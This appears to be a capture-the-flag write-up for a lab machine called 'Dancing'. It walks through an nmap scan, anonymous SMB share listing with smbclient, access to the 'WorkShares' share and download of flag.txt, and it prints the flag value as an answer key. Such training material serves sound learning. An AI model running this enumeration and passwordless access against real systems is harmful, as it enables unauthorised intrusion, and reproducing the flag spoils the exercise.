#### Task1: What does the 3-letter acronym SMB stand for?
In networking and IT, the 3-letter acronym
SMB stands for Server Message Block.
#### Task 2: What port does SMB use to operate at?
The primary port for modern Server Message Block (SMB) communication is TCP port 445.
#### Task 3: What is the service name for port 445 that came up in our Nmap scan?
```html
nmap 10.129.60.214 -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-04 16:31 CDT
Nmap scan report for 10.129.60.214
Host is up (0.0080s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  *microsoft-ds*?
```
**microsoft-ds**
#### Task 4: What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available SMB shares on Dancing?
```html
smbclient -L <IP_ADDRESS> -N
```
Explanation of the parts:
- -L: This is the switch that tells smbclient to list the shares offered by the server .
- -N: This stands for "no password." It suppresses the password prompt, which is necessary for testing anonymous or guest access (like on the "Dancing" machine) .
**-L**
#### Task 5: How many shares are there on Dancing?
```html
smbclient -L 10.129.60.214 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk
```
**4**
#### Task 6: What is the name of the share we are able to access in the end with a blank password?
**WorkShares**
#### Task 7: What is the command we can use within the SMB shell to download the files we find?
**get**
#### Task 8: 
```html
smbclient //<IP:PORT>/WorkShares -N
```
```html
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 03:38:03 2021
  ..                                  D        0  Thu Jun  3 03:38:03 2021
  flag.txt                            A       32  Mon Mar 29 04:26:57 2021

		5114111 blocks of size 4096. 1750230 blocks available
smb: \James.P\> get flag.txt

```
Then the flag was readen:
```html
5f61c10dffbc77a704d76016a22f1664
```
